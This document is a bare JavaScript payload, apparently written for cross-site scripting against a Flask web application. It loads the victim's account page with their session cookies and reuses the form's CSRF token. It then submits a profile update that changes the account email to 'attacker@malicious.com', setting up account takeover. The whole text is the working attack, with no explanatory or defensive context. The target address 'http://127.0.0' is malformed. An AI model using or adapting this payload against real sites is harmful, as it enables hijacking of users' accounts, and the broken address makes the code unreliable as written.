;(async () => {
  try {
    // 1. Fetch the account page to grab current session tokens if any exist
    const html = await fetch("http://127.0.0", { credentials: "include" }).then(r => r.text());
    
    // 2. Parse the HTML response
    const doc = new DOMParser().parseFromString(html, "text/html");
    const form = doc.querySelector("form");
    if (!form) return;

    const base = "http://127.0.0";
    const action = new URL(form.getAttribute("action") || "", base).href;
    
    // 3. Extract existing form data (maintaining CSRF tokens or hidden fields)
    const data = new FormData(form);
    
    // 4. Set the exact parameter name found in your Flask backend environment
    data.set("email", "attacker@malicious.com");

    // 5. Submit the form using URL-encoding matching the application specs
    const res = await fetch(action, { 
      method: "POST", 
      credentials: "include",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded"
      },
      body: new URLSearchParams(data) 
    });

    console.log(res.ok ? "Profile update request sent!" : "Failed to send update request", res.status);
  } catch (err) {
    console.error("Payload error:", err);
  }
})();
